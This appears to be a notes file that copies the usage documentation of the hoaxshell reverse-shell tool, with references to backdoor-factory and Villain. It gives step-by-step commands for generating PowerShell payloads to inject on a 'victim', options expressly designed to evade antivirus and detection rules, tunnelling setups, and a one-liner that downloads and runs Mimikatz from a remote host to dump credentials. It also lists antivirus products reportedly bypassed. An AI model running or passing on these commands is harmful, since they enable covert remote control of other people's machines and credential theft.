# the-backdoor-factory

# https://github.com/secretsquirrel/the-backdoor-factory.git
# https://github.com/t3l3machus/Villain.git
# git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
 

# Usage

Important: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the -g option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell.
Basic shell session over http

When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the "rawpayload" prompt command or start hoaxshell with the -r argument. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.
Payload that utilizes Invoke-Expression (default)

# sudo python3 hoaxshell.py -s <your_ip>

Payload that writes and executes commands from a file

Use -x to provide a .ps1 file name (absolute path) to be created on the victim machine. You should check the raw payload before executing, make sure the path you provided is solid.

sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

Recommended usage to avoid detection (over http)

Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. Use -H to provide a standard or custom http header name to avoid detection.

sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

Encrypted shell session (https + self-signed certificate)

This particular payload is kind of a red flag, as it begins with an additional block of code that instructs PowerShell to skip SSL certificate checks, which makes it suspicious and easy to detect as well as significantly longer in length. Not recommended.

# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

Encrypted shell session with a trusted certificate

If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem).

sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>

Grab session mode

In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.

sudo python3 hoaxshell.py -s <your_ip> -g

Important: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).
Constraint language mode support

Use any of the payload variations with the -cm (--constraint-mode) option to generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.

sudo python3 hoaxshell.py -s <your_ip> -cm

image
Shell session over https using tunneling tools (Ngrok / LocalTunnel)

Utilize tunnelling programmes Ngrok or LocalTunnel to get sessions through secure tunnels, overcominge issues like not having a Static IP address or your ISP forbidding Port-Forwarding.

Use -ng or --ngrok for Ngrok server

sudo python3 hoaxshell.py -ng

Use -lt or --localtunnel for LocalTunnel server

sudo python3 hoaxshell.py -lt

Limitations

The shell is going to hang if you execute a command that initiates an interactive session. Example:

# this command will execute succesfully and you will have no problem: 
> powershell echo 'This is a test'

# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:
> powershell

# In the same manner, you won't have a problem executing this:
> cmd /c dir /a

# But this will cause your hoaxshell to hang:
> cmd.exe

So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:

hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:4443/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'

Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.
AV Bypass PoCs

Some awesome people were kind enough to send me/publish PoC videos of executing hoaxshell's payloads against systems running AV solutions other than MS Defender, without being detected. Below is a reference table with links:

Important: I don't know if you can still use hoaxshell effectively to bypass these solutions. It's only reasonable to assume the detectability will change soon (if not already).
AV Solution 	Date 	PoC
SentinelOne 	2022-10-18 	https://twitter.com/i/status/1582137400880336896
Norton 	2022-10-17 	https://twitter.com/i/status/1582278579244929024
Bitdefender 	2022-10-15 	https://www.linkedin.com/posts/rohitjain-19_hoaxshell-cy83rr0h1t-penetrationtesting-activity-6987080745139765248-8cdT?utm_source=share&utm_medium=member_desktop
McAfee 	2022-10-15 	https://twitter.com/i/status/1581605531365814273
Kaspersky 	2022-10-13 	https://www.youtube.com/watch?v=IyMH_eCC4Rk
Sophos 	2022-09-08 	https://www.youtube.com/watch?v=NYR0rWx4x8k
News

    13/10/2022 - Added constraint language mode support (-cm) option.
    08/10/2022 - Added the -ng and -lt options that generate PS payloads for obtaining sessions using tunnelling tools ngrok or localtunnel in order to get around limitations like Static IP addresses and Port-Forwarding.
    06/09/2022 - A new payload was added that writes the commands to be executed in a file instead of utilizing Invoke-Expression. To use this, the user must provide a .ps1 file name (absolute path) on the victim machine using the -x option.
    04/09/2022 - Modifications were made to improve the command delivery mechanism as it included components that could be easily flagged. The -t option along with the https_payload_trusted.ps1 were added. You can now use hoaxshell by supplying a domain name along with a trusted certificate. This will generate a shorter and less detectable https payload.
    01/09/2022 - Added the -H option which allows users to give a custom name to the (random by default) header utilized in the attack process, carring the shell's session id. This makes the attack less detectable e.g. by using a standard header name e.g. "Authorization".
    31/08/2022 - Added the -i option that generates the PS payload adjusted to use "Invoke-RestMethod' instead of 'Invoke-WebRequest' utility, so now the user can choose (thanks to this issue). I also fixed a bug that existed in the prompt (it sometimes messed the path).
